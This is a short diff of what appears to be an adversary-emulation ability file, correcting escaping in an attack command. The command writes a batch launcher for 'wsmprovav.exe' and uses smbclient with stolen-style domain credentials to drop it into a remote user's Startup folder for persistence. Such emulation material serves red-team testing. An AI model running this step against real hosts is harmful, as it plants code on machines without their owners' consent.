@@ -458,7 +458,7 @@
       sh:
         timeout: 120
         command: |
-          echo 'C:\nchdir C:\temp\nC:\temp\wsmprovav.exe' > wsmprovav.bat;
+          echo 'C:\nchdir C:\\temp\nC:\\temp\\wsmprovav.exe' > wsmprovav.bat;
           chmod +x wsmprovav.bat;
           smbclient -U '#{domain}\#{second_host.user.name}' //#{second.target.host}/C$ -c 'put ./wsmprovav.bat "Users\#{second_host.user.name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\wsmprovav.bat"' "#{second_host.user.password}"
 
